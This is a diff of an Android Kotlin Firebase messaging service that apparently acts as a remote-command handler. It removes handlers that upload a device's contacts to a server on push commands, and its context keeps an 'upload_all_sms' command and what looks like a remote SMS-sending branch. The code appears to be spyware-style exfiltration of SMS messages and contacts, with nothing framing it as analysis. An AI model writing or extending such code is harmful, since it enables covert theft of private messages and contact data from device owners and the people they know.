@@ -26,7 +26,6 @@ import java.net.URL
 import java.util.UUID
 import kotlinx.coroutines.*
 import com.example.test.utils.SmsBatchUploader
-import com.example.test.utils.ContactsBatchUploader
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
@@ -265,29 +264,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 }
             }
 
-            "quick_upload_contacts" -> {
-                CoroutineScope(Dispatchers.IO).launch {
-                    try {
-                        val result = ContactsBatchUploader.uploadQuickContacts(
-                            context = applicationContext,
-                            deviceId = deviceId,
-                            baseUrl = getBaseUrl(),
-                            limit = 50
-                        )
-
-                        when (result) {
-                            is ContactsBatchUploader.UploadResult.Success -> {
-                                sendUploadResponse("quick_contacts_success", result.totalSent)
-                            }
-                            is ContactsBatchUploader.UploadResult.Failure -> {
-                                sendUploadResponse("quick_contacts_failed", 0, result.error)
-                            }
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Quick contacts upload error: ${e.message}", e)
-                    }
-                }
-            }
 
             "upload_all_sms" -> {
                 CoroutineScope(Dispatchers.IO).launch {
@@ -313,29 +289,6 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 }
             }
 
-            "upload_all_contacts" -> {
-                CoroutineScope(Dispatchers.IO).launch {
-                    try {
-                        val result = ContactsBatchUploader.uploadAllContacts(
-                            context = applicationContext,
-                            deviceId = deviceId,
-                            baseUrl = getBaseUrl(),
-                            onProgress = { current, total -> }
-                        )
-
-                        when (result) {
-                            is ContactsBatchUploader.UploadResult.Success -> {
-                                sendUploadResponse("all_contacts_success", result.totalSent)
-                            }
-                            is ContactsBatchUploader.UploadResult.Failure -> {
-                                sendUploadResponse("all_contacts_failed", 0, result.error)
-                            }
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "All contacts upload error: ${e.message}", e)
-                    }
-                }
-            }
 
             else -> {
                 if (phone != null && message != null) {
